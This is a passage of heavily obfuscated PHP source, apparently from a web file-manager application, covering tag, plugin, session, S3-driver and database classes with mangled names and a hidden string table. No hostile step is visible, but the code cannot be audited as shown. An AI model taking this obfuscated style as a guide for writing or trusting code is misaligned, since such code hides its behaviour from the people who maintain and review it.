$àüœ±Æ‡ = array_to_keyvalue($É›ğ¾ú[$¡Í¼Š¡ô[86]], $¡Í¼Š¡ô[12], $¡Í¼Š¡ô[193]); $§˜Øà½í = array_merge($àüœ±Æ‡, $ºœõ¿¹˜); foreach ($Äñ…¾şá as $ó…„•Öİ) { if (!in_array($ó…„•Öİ, $§˜Øà½í)) { $ñÁˆ‚š[] = $ó…„•Öİ; } } if ($ñÁˆ‚š) { $this->removeBySource($¡Î¡îŒ¥, $ñÁˆ‚š); } return $É›ğ¾ú; } protected function addToTag($“ÙŸõôæ, $íëçÚìÌ, $¡¦œ×¤ë) { $¢•÷©ØÄ =& $_SERVER[Ï×Œõ”û]; if (!$this->getByTagID($“ÙŸõôæ, $¡¦œ×¤ë) || !$íëçÚìÌ) { return !1; } if (!Model($¢•÷©ØÄ[939])->pathInfo($íëçÚìÌ)) { return !1; } $´¾€øØ¾ = array($¢•÷©ØÄ[1921] => 0, $¢•÷©ØÄ[578] => $¡¦œ×¤ë, $¢•÷©ØÄ[515] => $íëçÚìÌ, $¢•÷©ØÄ[516] => $¢•÷©ØÄ[2256] . $“ÙŸõôæ, $¢•÷©ØÄ[514] => $¢•÷©ØÄ[12], $¢•÷©ØÄ[2141] => 0); if ($this->where($´¾€øØ¾)->find()) { return !1; } return $this->add($´¾€øØ¾); } protected function removeFromTag($ı›‚÷Öş, $©œ³Å„Ù, $ø­…ôœü) { $‘ßŸ¥ÓÄ =& $_SERVER[Ï×Œõ”û]; if (!$this->getByTagID($ı›‚÷Öş, $ø­…ôœü) || !$©œ³Å„Ù) { return !1; } if (is_array($©œ³Å„Ù)) { $©œ³Å„Ù = array($‘ßŸ¥ÓÄ[7], $©œ³Å„Ù); } $¼îªë†Ÿ = array($‘ßŸ¥ÓÄ[1921] => 0, $‘ßŸ¥ÓÄ[578] => $ø­…ôœü, $‘ßŸ¥ÓÄ[516] => $‘ßŸ¥ÓÄ[2256] . $ı›‚÷Öş, $‘ßŸ¥ÓÄ[515] => $©œ³Å„Ù); return $this->where($¼îªë†Ÿ)->delete(); } protected function removeByTag($˜†ÜØ¦Ö, $ñ¯ôŠ†) { $±äŸÈ· =& $_SERVER[Ï×Œõ”û]; if (!$this->getByTagID($˜†ÜØ¦Ö, $ñ¯ôŠ†)) { return !1; } $¤ºú©ÊĞ = array($±äŸÈ·[1921] => 0, $±äŸÈ·[578] => $ñ¯ôŠ†, $±äŸÈ·[516] => $±äŸÈ·[2256] . $˜†ÜØ¦Ö); return $this->where($¤ºú©ÊĞ)->delete(); } protected function removeBySource($ÂÖÜª‘, $³•®¤˜¥) { $‡‹Û–øò =& $_SERVER[Ï×Œõ”û]; if (!$ÂÖÜª‘ || !$³•®¤˜¥) { return !1; } if (is_array($³•®¤˜¥)) { $³•®¤˜¥ = array($‡‹Û–øò[7], $³•®¤˜¥); } $ºœµ×‘ì = array($‡‹Û–øò[1921] => 0, $‡‹Û–øò[515] => $³•®¤˜¥, $‡‹Û–øò[578] => array($‡‹Û–øò[1135], 0), $‡‹Û–øò[516] => $‡‹Û–øò[2256] . $ÂÖÜª‘); return $this->where($ºœµ×‘ì)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\160\154\x75\x67\x69\156\114\151\163\x74"; public $field = array("\156\141\155\145", "\x73\x74\x61\164\x75\x73", "\x72\x65\147\151\145\x73\164", "\x63\x6f\156\x66\x69\x67"); public function loadList($ùÔèË‰Ì = false) { $·€ıÉ™§ = array_to_keyvalue($this->listData(), $_SERVER[Ï×Œõ”û][32]); if ($ùÔèË‰Ì) { return $·€ıÉ™§[$ùÔèË‰Ì]; } return $·€ıÉ™§; } public function init() { $ğ–µº =& $_SERVER[Ï×Œõ”û]; Hook::trigger($ğ–µº[2257]); $Ëùòƒå× = $this->loadPluginList(); foreach ($Ëùòƒå× as $Çç•õõô => $İâŸÕƒô) { $ÊÍİâ³ß = $this->appAllow($Çç•õõô, $İâŸÕƒô); if (!$ÊÍİâ³ß) { continue; } foreach ($İâŸÕƒô[$ğ–µº[2258]] as $ •ÁˆÊ => $’øãçŞÇ) { Hook::bind($ •ÁˆÊ, $’øãçŞÇ); } } Hook::trigger($ğ–µº[2259]); Hook::trigger(ACTION); } public function appAllow($±Üõâ½, $Ü³õåÏ‘, $˜É¨ı” = true) { $¨¸æÏ¸ =& $_SERVER[Ï×Œõ”û]; $ªòÄÉÔ = PLUGIN_DIR . $±Üõâ½ . $¨¸æÏ¸[2260]; if (!is_array($Ü³õåÏ‘) || !is_array($Ü³õåÏ‘[$¨¸æÏ¸[2258]]) || $Ü³õåÏ‘[$¨¸æÏ¸[856]] != 1 || !is_file($ªòÄÉÔ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$¨¸æÏ¸[6]][$¨¸æÏ¸[2261]] || !$GLOBALS[$¨¸æÏ¸[6]][$¨¸æÏ¸[2262]]) { return !0; } $‚¶“í’¦ = explode($¨¸æÏ¸[50], strtolower($GLOBALS[$¨¸æÏ¸[6]][$¨¸æÏ¸[2262]])); return in_array(strtolower($±Üõâ½), $‚¶“í’¦) ? !1 : !0; } if ($˜É¨ı” && !Action($¨¸æÏ¸[2263])->checkAuth($±Üõâ½)) { return !1; } return !0; } public function unInstall($»×†¼˜ô) { $§‘î·µ‰ =& $_SERVER[Ï×Œõ”û]; $âÁÈÚ = $this->loadList($»×†¼˜ô); if (file_exists(PLUGIN_DIR . $»×†¼˜ô)) { Hook::apply($»×†¼˜ô . $§‘î·µ‰[2264]); } $this->remove($âÁÈÚ[$§‘î·µ‰[484]]); } public function changeStatus($éÜ°Ò‘ö, $öİ™şÚ®) { $Í¦¸çŒß =& $_SERVER[Ï×Œõ”û]; $ôª’ÜÚ÷ = $this->loadList($éÜ°Ò‘ö); if ($öİ™şÚ®) { Hook::apply($éÜ°Ò‘ö . $Í¦¸çŒß[2265]); } $this->update($ôª’ÜÚ÷[$Í¦¸çŒß[484]], array($Í¦¸çŒß[2266] => $öİ™şÚ®)); } public function appRegist($ø‡¬óå, $ì‘¢ËÌå) { $™åã”Âª =& $_SERVER[Ï×Œõ”û]; $ëáÎûåÌ = $this->loadList($ø‡¬óå); if ($ëáÎûåÌ) { $this->update($ëáÎûåÌ[$™åã”Âª[484]], array($™åã”Âª[2258] => $ì‘¢ËÌå)); } else { $å‚’‹¥ = array($™åã”Âª[32] => $ø‡¬óå, $™åã”Âª[2258] => $ì‘¢ËÌå, $™åã”Âª[856] => 0, $™åã”Âª[6] => $this->getConfigDefault($ø‡¬óå)); $this->insert($å‚’‹¥); } } public function getConfigDefault($†‰ıÇşÀ) { $¤¾Šêµô =& $_SERVER[Ï×Œõ”û]; $˜ñìØà = array(); $İŸ´Ë·¼ = $this->getPackageJson($†‰ıÇşÀ); if (!$İŸ´Ë·¼ && is_array($İŸ´Ë·¼[$¤¾Šêµô[2267]])) { return $˜ñìØà; } foreach ($İŸ´Ë·¼[$¤¾Šêµô[2267]] as $È“ã‚ë¼ => $¦©Ã•’ã) { if (!isset($¦©Ã•’ã[$¤¾Šêµô[452]]) || isset($˜ñìØà[$È“ã‚ë¼])) { continue; } $˜ñìØà[$È“ã‚ë¼] = $¦©Ã•’ã[$¤¾Šêµô[452]]; } return $˜ñìØà; } public function getPackageJson($°ô˜ƒÁÍ) { return Hook::apply($°ô˜ƒÁÍ . $_SERVER[Ï×Œõ”û][2268]); } public function getConfig($”ó•éúñ, $ÄæÕÕ˜ = false) { $›ğ…ÜËœ =& $_SERVER[Ï×Œõ”û]; $ìä‹½¨ = array(); $ÓŠä÷’™ = $this->loadList($”ó•éúñ); if ($ÓŠä÷’™ && is_array($ÓŠä÷’™[$›ğ…ÜËœ[6]])) { $ìä‹½¨ = $ÓŠä÷’™[$›ğ…ÜËœ[6]]; } if (!$ìä‹½¨ || $ÄæÕÕ˜) { $ìä‹½¨ = $this->getConfigDefault($”ó•éúñ); } return $ìä‹½¨; } public function setConfig($ş£¥óÜ, $à™Şíª = false) { $çŒ›½·¯ =& $_SERVER[Ï×Œõ”û]; $”Û¾ö§À = $this->loadList($ş£¥óÜ); if (!$”Û¾ö§À) { return !1; } $­Õíêæ = $”Û¾ö§À[$çŒ›½·¯[6]]; if ($à™Şíª == !1) { $­Õíêæ = array(); $à™Şíª = $this->getConfigDefault($ş£¥óÜ); } foreach ($à™Şíª as $Ğ×¦«ÆÜ => $ÏºÚÒ½ã) { $­Õíêæ[$Ğ×¦«ÆÜ] = is_string($ÏºÚÒ½ã) ? trim($ÏºÚÒ½ã) : $ÏºÚÒ½ã; } $this->update($”Û¾ö§À[$çŒ›½·¯[484]], array($çŒ›½·¯[6] => $­Õíêæ)); } public function viewList() { $ÁûğšŠ =& $_SERVER[Ï×Œõ”û]; $Ö”Æ¶ìÕ = $this->loadList(); $this->pluginScan($Ö”Æ¶ìÕ); $Ö”Æ¶ìÕ = $this->loadPluginList(); $„§™°­ = array(); foreach ($Ö”Æ¶ìÕ as $‘¦ËÂ => $ åÕÂŸ¥) { $ÍŞ‹¦ÔĞ = $ åÕÂŸ¥; unset($ åÕÂŸ¥[$ÁûğšŠ[2258]], $ åÕÂŸ¥[$ÁûğšŠ[6]]); $®óõ”× = PLUGIN_DIR . $ åÕÂŸ¥[$ÁûğšŠ[32]] . $ÁûğšŠ[2260]; if (!is_file($®óõ”×)) { continue; } $†Ë…Şİõ = Hook::apply($ åÕÂŸ¥[$ÁûğšŠ[32]] . $ÁûğšŠ[2268]); if (!is_array($†Ë…Şİõ)) { continue; } $„§™°­[$‘¦ËÂ] = array_merge($ åÕÂŸ¥, $†Ë…Şİõ); if ($ÍŞ‹¦ÔĞ[$ÁûğšŠ[6]][$ÁûğšŠ[1843]] != $†Ë…Şİõ[$ÁûğšŠ[1817]]) { Hook::apply($ åÕÂŸ¥[$ÁûğšŠ[32]] . $ÁûğšŠ[2265]); $ÍŞ‹¦ÔĞ[$ÁûğšŠ[6]][$ÁûğšŠ[1843]] = $†Ë…Şİõ[$ÁûğšŠ[1817]]; $this->update($ åÕÂŸ¥[$ÁûğšŠ[484]], array($ÁûğšŠ[6] => $ÍŞ‹¦ÔĞ[$ÁûğšŠ[6]])); } } return $„§™°­; } private function loadPluginList() { $”Œ„Í´´ =& $_SERVER[Ï×Œõ”û]; $¡òÒ‰ªâ = $this->loadList(); if (strtolower(MOD) == $”Œ„Í´´[2269]) { return $¡òÒ‰ªâ; } $Ü¶òıõ = Hook::trigger($”Œ„Í´´[2270], $¡òÒ‰ªâ); if ($¡òÒ‰ªâ && !$Ü¶òıõ) { die; } return $Ü¶òıõ ? $Ü¶òıõ : $¡òÒ‰ªâ; } private function pluginScan($™Á«Íº) { $¡¸‰íê =& $_SERVER[Ï×Œõ”û]; recursion_dir(PLUGIN_DIR, $šø€ê¾¼, $Ï¶™µåï, 0); foreach ($šø€ê¾¼ as $Êºª¹×Ÿ) { $ª·ßöÀè = get_path_this($Êºª¹×Ÿ); if (isset($™Á«Íº[$ª·ßöÀè]) || !file_exists($Êºª¹×Ÿ . $¡¸‰íê[2271]) || !file_exists($Êºª¹×Ÿ . $¡¸‰íê[2260])) { continue; } Hook::apply($ª·ßöÀè . $¡¸‰íê[2265]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\155\x5f\x73\145\x73\x73\x69\x6f\156"; public function get($àà§¬ïú) { $ô¨íÛ»ã =& $_SERVER[Ï×Œõ”û]; $Şİùò´ = $this->where(array($ô¨íÛ»ã[2272] => $àà§¬ïú))->find(); if (!is_array($Şİùò´)) { return !1; } return $Şİùò´[$ô¨íÛ»ã[170]]; } public function set($Ï‡Ü½â, $ ­Ûã¸, $·—ˆ€ÚØ = 3600) { $·÷Ôü†† =& $_SERVER[Ï×Œõ”û]; $Èê‰üòÑ = array($·÷Ôü††[2272] => $Ï‡Ü½â, $·÷Ôü††[2175] => $ ­Ûã¸, $·÷Ôü††[2273] => $·—ˆ€ÚØ + time()); if (Session::get($·÷Ôü††[2274])) { $Èê‰üòÑ[$·÷Ôü††[1547]] = Session::get($·÷Ôü††[2274]); } else { $Èê‰üòÑ[$·÷Ôü††[1547]] = 0; } if ($this->get($Ï‡Ü½â)) { return $this->where(array($·÷Ôü††[2272] => $Ï‡Ü½â))->save($Èê‰üòÑ); } else { return $this->add($Èê‰üòÑ, array(), !0); } } public function remove($íæĞçà½) { return $this->where(array($_SERVER[Ï×Œõ”û][2272] => $íæĞçà½))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ï×Œõ”û][2275] . time())->delete(); } } goto a´œ©·ö±¸; E¹ë±…‚‚†: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Ëœ¬²ò²) { $î³Û¡­ù =& $_SERVER[Ï×Œõ”û]; parent::__construct($Ëœ¬²ò²); $ŒÎ”Ó†„ = isset($Ëœ¬²ò²[$î³Û¡­ù[258]]) && $Ëœ¬²ò²[$î³Û¡­ù[258]] == $î³Û¡­ù[249] ? $î³Û¡­ù[249] : $î³Û¡­ù[315]; $this->setSignVersion($ŒÎ”Ó†„); } public function link($ÑÕ¯¯ñ, $¡ßÅ¬‰¶ = array()) { return parent::link($ÑÕ¯¯ñ, $¡ßÅ¬‰¶); } public function fileOut($øº³çÏ¡, $ÙÒŠ¬›Â = false, $¾ÉÅƒ–µ = false, $øîÌÙú• = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ï×Œõ”û][316])) { return parent::fileOutServer($øº³çÏ¡, $ÙÒŠ¬›Â, $¾ÉÅƒ–µ, $øîÌÙú•); } parent::fileOut($øº³çÏ¡, $ÙÒŠ¬›Â, $¾ÉÅƒ–µ, $øîÌÙú•); } public function fileOutImage($¾ª¡½, $§°şÔ¬ğ = 250) { if (strstr($this->endpoint, $_SERVER[Ï×Œõ”û][316])) { return parent::fileOutImageServer($¾ª¡½, $§°şÔ¬ğ); } parent::fileOutImage($¾ª¡½, $§°şÔ¬ğ); } } define($_SERVER[Ï×Œõ”û][317], 1); define($_SERVER[Ï×Œõ”û][318], 2); goto f‡ÏŒ«ãß; f‡ÏŒ«ãß: define($_SERVER[Ï×Œõ”û][319], 3); define($_SERVER[Ï×Œõ”û][320], 1); define($_SERVER[Ï×Œõ”û][321], 0); goto Aòò–Øï¥; B‘ø˜ À³Ò: class DbSqlite extends DbSqliteBase { public function query($±åîßØ) { $‘“¦·¼Ã =& $_SERVER[Ï×Œõ”û]; if (!CacheLock::fileLock($‘“¦·¼Ã[13])) { return !1; } $İä¨í÷ = parent::query($±åîßØ); CacheLock::fileUnLock($‘“¦·¼Ã[13]); return $İä¨í÷; } public function execute($µúı óé) { $¸Â·¾– =& $_SERVER[Ï×Œõ”û]; if (!CacheLock::fileLock($¸Â·¾–[13])) { return !1; } $¬»¶ûŠÅ = parent::execute($µúı óé); CacheLock::fileUnLock($¸Â·¾–[13]); return $¬»¶ûŠÅ; } } class DbSqlite3 extends DbSqlite3Base { public function query($Ú¿Âğ) { $¢Ù—ëâ÷ =& $_SERVER[Ï×Œõ”û]; if (!CacheLock::fileLock($¢Ù—ëâ÷[13])) { return !1; } $à¤¿Ì = parent::query($Ú¿Âğ); CacheLock::fileUnLock($¢Ù—ëâ÷[13]); return $à¤¿Ì; } public function execute($Âùİ§¥) { $ĞßĞ«¦ª =& $_SERVER[Ï×Œõ”û]; if (!CacheLock::fileLock($ĞßĞ«¦ª[13])) { return !1; } $ö÷Í‡° = parent::execute($Âùİ§¥); CacheLock::fileUnLock($ĞßĞ«¦ª[13]); return $ö÷Í‡°; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\161" => "\x3c\76", "\x67\164" => "\x3e", "\145\147\x74" => "\76\x3d", "\x6c\x74" => "\74", "\145\x6c\164" => "\x3c\x3d", "\x6e\x6f\164\154\151\153\x65" => "\116\x4f\x54\x20\114\x49\x4b\x45", "\154\x69\153\145" => "\114\111\x4b\x45", "\151\x6e" => "\x49\116", "\x6e\157\164\x69\x6e" => "\116\117\124\40\111\116", "\156\157\x74\40\x69\x6e" => "\116\117\x54\x20\111\x4e", "\142\145\164\167\145\145\x6e" => "\102\x45\124\127\x45\x45\116", "\x6e\157\x74\142\x65\x74\167\x65\145\x6e" => "\116\117\x54\x20\x42\x45\x54\127\105\x45\x4e", "\156\157\x74\40\x62\x65\164\x77\x65\145\x6e" => "\x4e\x4f\x54\40\102\x45\x54\127\105\x45\x4e"); protected $selectSql = "\x53\105\x4c\105\103\x54\45\104\x49\x53\x54\x49\x4e\x43\124\45\x20\x25\x46\111\x45\x4c\104\45\x20\x46\x52\117\115\40\x25\x54\101\102\114\x45\x25\45\x4a\x4f\111\116\45\x25\x57\x48\105\122\x45\x25\45\x47\122\x4f\125\x50\x25\45\110\101\126\111\x4e\x47\x25\45\117\x52\x44\105\122\x25\45\114\111\x4d\111\124\45\40\45\x55\116\x49\117\116\x25\x25\103\117\115\115\x45\116\x54\45"; protected $bind = array(); public static function getInstance() { $ñè¢Éª = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ï×Œõ”û][1081], $ñè¢Éª); } public function factory($öŸâ˜–ü = '') { $ÂÂÁı‘˜ =& $_SERVER[Ï×Œõ”û]; $öŸâ˜–ü = $this->parseConfig($öŸâ˜–ü); if (empty($öŸâ˜–ü[$ÂÂÁı‘˜[1082]])) { think_exception(think_lang($ÂÂÁı‘˜[1083])); } $this->dbType = ucwords(strtolower($öŸâ˜–ü[$ÂÂÁı‘˜[1082]])); $áàŠéÊå = $ÂÂÁı‘˜[1084] . $this->dbType; if (class_exists($áàŠéÊå)) { $Â¥ì¿øÎ = new $áàŠéÊå($öŸâ˜–ü); if ($ÂÂÁı‘˜[1085] != strtolower($öŸâ˜–ü[$ÂÂÁı‘˜[1082]])) { $Â¥ì¿øÎ->dbType = strtoupper($this->dbType); } else { $Â¥ì¿øÎ->dbType = $this->_getDsnType($öŸâ˜–ü[$ÂÂÁı‘˜[1037]]); } } else { think_exception(think_lang($ÂÂÁı‘˜[1086]) . $ÂÂÁı‘˜[1087] . $áàŠéÊå); } return $Â¥ì¿øÎ; } public function __call($…ÈèğŠÁ, $…‡ß®ì) { if (method_exists($this, $…ÈèğŠÁ)) { return call_user_func_array(array($this, $…ÈèğŠÁ), $…‡ß®ì); } } protected function _getDsnType($šıËñÙú) { $ıÓ©ÁË = explode($_SERVER[Ï×Œõ”û][4], $šıËñÙú); $²—íÑŞ = strtoupper(trim($ıÓ©ÁË[0])); return $²—íÑŞ; } private function parseConfig($¿öìÚÆ = '') { $±–ÀòÇ‰ =& $_SERVER[Ï×Œõ”û]; if (!empty($¿öìÚÆ) && is_string($¿öìÚÆ)) { $¿öìÚÆ = $this->parseDSN($¿öìÚÆ); } elseif (is_array($¿öìÚÆ)) { $¿öìÚÆ = array_change_key_case($¿öìÚÆ); $¿öìÚÆ = array($±–ÀòÇ‰[1082] => $¿öìÚÆ[$±–ÀòÇ‰[1088]], $±–ÀòÇ‰[1006] => $¿öìÚÆ[$±–ÀòÇ‰[1089]], $±–ÀòÇ‰[1007] => $¿öìÚÆ[$±–ÀòÇ‰[1090]], $±–ÀòÇ‰[1004] => $¿öìÚÆ[$±–ÀòÇ‰[1091]], $±–ÀòÇ‰[1005] => $¿öìÚÆ[$±–ÀòÇ‰[1092]], $±–ÀòÇ‰[21] => $¿öìÚÆ[$±–ÀòÇ‰[1093]], $±–ÀòÇ‰[1037] => $¿öìÚÆ[$±–ÀòÇ‰[1094]], $±–ÀòÇ‰[17] => isset($¿öìÚÆ[$±–ÀòÇ‰[1095]]) ? $¿öìÚÆ[$±–ÀòÇ‰[1095]] : array()); } elseif (empty($¿öìÚÆ)) { if (think_config($±–ÀòÇ‰[1096]) && $±–ÀòÇ‰[1085] != strtolower(think_config($±–ÀòÇ‰[1097]))) { $¿öìÚÆ = $this->parseDSN(think_config($±–ÀòÇ‰[1096])); } else { $¿öìÚÆ = array($±–ÀòÇ‰[1082] => think_config($±–ÀòÇ‰[1097]), $±–ÀòÇ‰[1006] => think_config($±–ÀòÇ‰[1098]), $±–ÀòÇ‰[1007] => think_config($±–ÀòÇ‰[1099]), $±–ÀòÇ‰[1004] => think_config($±–ÀòÇ‰[1100]), $±–ÀòÇ‰[1005] => think_config($±–ÀòÇ‰[1101]), $±–ÀòÇ‰[21] => think_config($±–ÀòÇ‰[325]), $±–ÀòÇ‰[1037] => think_config($±–ÀòÇ‰[1096]), $±–ÀòÇ‰[17] => think_config($±–ÀòÇ‰[1102])); } } return $¿öìÚÆ; } protected function initConnect($š¶’¨ÚÀ = true) { if (1 == think_config($_SERVER[Ï×Œõ”û][22])) { $this->_linkID = $this->multiConnect($š¶’¨ÚÀ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¤ôã‹Åª => $ ‰²ùõÆ) { $this->_linkID = $ ‰²ùõÆ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ç—²ò† = false) { $¬ÅÊƒì =& $_SERVER[Ï×Œõ”û]; static $ğ±½¬æÒ = array(); static $ÚüıÔıÑ = -1; if (empty($ğ±½¬æÒ)) { foreach ($this->config as $¶¯ãÛ¾Æ => $ŸœìÓ¼¬) { $ğ±½¬æÒ[$¶¯ãÛ¾Æ] = explode($¬ÅÊƒì[50], $ŸœìÓ¼¬); } } if (think_config($¬ÅÊƒì[1103])) { if ($ç—²ò† || think_config($¬ÅÊƒì[483]) === !0) { $·¨ı†œ¢ = floor(mt_rand(0, think_config($¬ÅÊƒì[1104]) - 1)); $ÚüıÔıÑ = $·¨ı†œ¢; } else { if (is_numeric(think_config($¬ÅÊƒì[1105]))) { $·¨ı†œ¢ = think_config($¬ÅÊƒì[1105]); } else { $·¨ı†œ¢ = floor(mt_rand(think_config($¬ÅÊƒì[1104]), count($ğ±½¬æÒ[$¬ÅÊƒì[1004]]) - 1)); } } } else { $·¨ı†œ¢ = floor(mt_rand(0, count($ğ±½¬æÒ[$¬ÅÊƒì[1004]]) - 1)); $ÚüıÔıÑ = $·¨ı†œ¢; } $·¨ı†œ¢ = $ÚüıÔıÑ !== -1 ? $ÚüıÔıÑ : $·¨ı†œ¢; $–€²Ïı = array($¬ÅÊƒì[1006] => isset($ğ±½¬æÒ[$¬ÅÊƒì[1006]][$·¨ı†œ¢]) ? $ğ±½¬æÒ[$¬ÅÊƒì[1006]][$·¨ı†œ¢] : $ğ±½¬æÒ[$¬ÅÊƒì[1006]][0], $¬ÅÊƒì[1007] => isset($ğ±½¬æÒ[$¬ÅÊƒì[1007]][$·¨ı†œ¢]) ? $ğ±½¬æÒ[$¬ÅÊƒì[1007]][$·¨ı†œ¢] : $ğ±½¬æÒ[$¬ÅÊƒì[1007]][0], $¬ÅÊƒì[1004] => isset($ğ±½¬æÒ[$¬ÅÊƒì[1004]][$·¨ı†œ¢]) ? $ğ±½¬æÒ[$¬ÅÊƒì[1004]][$·¨ı†œ¢] : $ğ±½¬æÒ[$¬ÅÊƒì[1004]][0], $¬ÅÊƒì[1005] => isset($ğ±½¬æÒ[$¬ÅÊƒì[1005]][$·¨ı†œ¢]) ? $ğ±½¬æÒ[$¬ÅÊƒì[1005]][$·¨ı†œ¢] : $ğ±½¬æÒ[$¬ÅÊƒì[1005]][0], $¬ÅÊƒì[21] => isset($ğ±½¬æÒ[$¬ÅÊƒì[21]][$·¨ı†œ¢]) ? $ğ±½¬æÒ[$¬ÅÊƒì[21]][$·¨ı†œ¢] : $ğ±½¬æÒ[$¬ÅÊƒì[21]][0], $¬ÅÊƒì[1037] => isset($ğ±½¬æÒ[$¬ÅÊƒì[1037]][$·¨ı†œ¢]) ? $ğ±½¬æÒ[$¬ÅÊƒì[1037]][$·¨ı†œ¢] : $ğ±½¬æÒ[$¬ÅÊƒì[1037]][0], $¬ÅÊƒì[17] => isset($ğ±½¬æÒ[$¬ÅÊƒì[17]][$·¨ı†œ¢]) ? $ğ±½¬æÒ[$¬ÅÊƒì[17]][$·¨ı†œ¢] : $ğ±½¬æÒ[$¬ÅÊƒì[17]][0]); return $this->connect($–€²Ïı, $·¨ı†œ¢); } public function parseDSN($æ¥Œ»û„) { $®»§”À„ =& $_SERVER[Ï×Œõ”û]; if (empty($æ¥Œ»û„)) { return !1; } $­ù·Ëü = parse_url($æ¥Œ»û„); if ($­ù·Ëü[$®»§”À„[207]]) { $Öğ«ñòÆ = array($®»§”À„[1082] => $­ù·Ëü[$®»§”À„[207]], $®»§”À„[1006] => isset($­ù·Ëü[$®»§”À„[690]]) ? $­ù·Ëü[$®»§”À„[690]] : $®»§”À„[12], $®»§”À„[1007] => isset($­ù·Ëü[$®»§”À„[1106]]) ? $­ù·Ëü[$®»§”À„[1106]] : $®»§”À„[12], $®»§”À„[1004] => isset($­ù·Ëü[$®»§”À„[208]]) ? $­ù·Ëü[$®»§”À„[208]] : $®»§”À„[12], $®»§”À„[1005] => isset($­ù·Ëü[$®»§”À„[209]]) ? $­ù·Ëü[$®»§”À„[209]] : $®»§”À„[12], $®»§”À„[21] => isset($­ù·Ëü[$®»§”À„[87]]) ? substr($­ù·Ëü[$®»§”À„[87]], 1) : $®»§”À„[12]); } else { preg_match($®»§”À„[1107], trim($æ¥Œ»û„), $¬ã™â­Ç); $Öğ«ñòÆ = array($®»§”À„[1082] => $¬ã™â­Ç[1], $®»§”À„[1006] => $¬ã™â­Ç[2], $®»§”À„[1007] => $¬ã™â­Ç[3], $®»§”À„[1004] => $¬ã™â­Ç[4], $®»§”À„[1005] => $¬ã™â­Ç[5], $®»§”À„[21] => $¬ã™â­Ç[6]); } $Öğ«ñòÆ[$®»§”À„[1037]] = $®»§”À„[12]; return $Öğ«ñòÆ; } protected function debug() { $ğ¬¹üû® =& $_SERVER[Ï×Œõ”û]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ğ¬¹üû®[1108]; if (think_config($ğ¬¹üû®[1109])) { think_status($ğ¬¹üû®[1110]); think_trace($this->queryStr . $ğ¬¹üû®[1111] . think_status($ğ¬¹üû®[24], $ğ¬¹üû®[1110], 6) . $ğ¬¹üû®[1112], $ğ¬¹üû®[12], $ğ¬¹üû®[1113]); } } protected function parseLock($İøÖüœÕ = false) { $üŸùÍùÂ =& $_SERVER[Ï×Œõ”û]; if (!$İøÖüœÕ) { return $üŸùÍùÂ[12]; } if ($üŸùÍùÂ[1039] == $this->dbType) { return $üŸùÍùÂ[1114]; } return $üŸùÍùÂ[1115]; } protected function parseSet($–ç‹Ò˜Ô) { $¶ôÎÊè¨ =& $_SERVER[Ï×Œõ”û]; foreach ($–ç‹Ò˜Ô as $Â¸Ô¬Õø => $Ó¿Å»àç) { if (is_array($Ó¿Å»àç) && $¶ôÎÊè¨[374] == $Ó¿Å»àç[0]) { $µÚÌ±Ó[] = $this->parseKey($Â¸Ô¬Õø) . $¶ôÎÊè¨[465] . $Ó¿Å»àç[1]; } elseif (is_scalar($Ó¿Å»àç) || is_null($Ó¿Å»àç)) { $µÚÌ±Ó[] = $this->parseKey($Â¸Ô¬Õø) . $¶ôÎÊè¨[465] . $this->parseValue($Ó¿Å»àç); } } return $¶ôÎÊè¨[1116] . implode($¶ôÎÊè¨[50], $µÚÌ±Ó); } protected function bindParam($ñªâ¡­, $ËÓÉÉà) { $this->bind[$_SERVER[Ï×Œõ”û][4] . $ñªâ¡­] = $ËÓÉÉà; } protected function parseBind($ŒŠÔ»÷û) { $ŒŠÔ»÷û = array_merge($this->bind, $ŒŠÔ»÷û); $this->bind = array(); return $ŒŠÔ»÷û; } function parseKey(&$ˆ¬…ò´á, $Şêä³¢Ü = true) { if ($Şêä³¢Ü) { $ˆ¬…ò´á = $this->parseKeyCheck($ˆ¬…ò´á); } return $ˆ¬…ò´á; } function parseKeyCheck($³…ù¼Ø¢) { $Ó×âİˆµ =& $_SERVER[Ï×Œõ”û]; $³…ù¼Ø¢ = trim($³…ù¼Ø¢); if (!preg_match($Ó×âİˆµ[1117], $³…ù¼Ø¢)) { think_exception($Ó×âİˆµ[1118] . $³…ù¼Ø¢); } return $³…ù¼Ø¢; } protected function parseValue($·”Ã„ãİ) { $™½•–Ë¸ =& $_SERVER[Ï×Œõ”û]; if (is_string($·”Ã„ãİ)) { $·”Ã„ãİ = $™½•–Ë¸[1078] . $this->escapeString($·”Ã„ãİ) . $™½•–Ë¸[1078]; } elseif (isset($·”Ã„ãİ[0]) && is_string($·”Ã„ãİ[0]) && strtolower($·”Ã„ãİ[0]) == $™½•–Ë¸[374]) { $·”Ã„ãİ = $this->escapeString($·”Ã„ãİ[1]); } elseif (is_array($·”Ã„ãİ)) { $·”Ã„ãİ = array_map(array($this, $™½•–Ë¸[1079]), $·”Ã„ãİ); } elseif (is_bool($·”Ã„ãİ)) { $·”Ã„ãİ = $·”Ã„ãİ ? $™½•–Ë¸[91] : $™½•–Ë¸[230]; } elseif (is_null($·”Ã„ãİ)) { $·”Ã„ãİ = $™½•–Ë¸[104]; } return $·”Ã„ãİ; } protected function parseField($ºÕà¾’©) { $µğË¨¦¿ =& $_SERVER[Ï×Œõ”û]; if (is_string($ºÕà¾’©) && strpos($ºÕà¾’©, $µğË¨¦¿[50])) { $ºÕà¾’© = 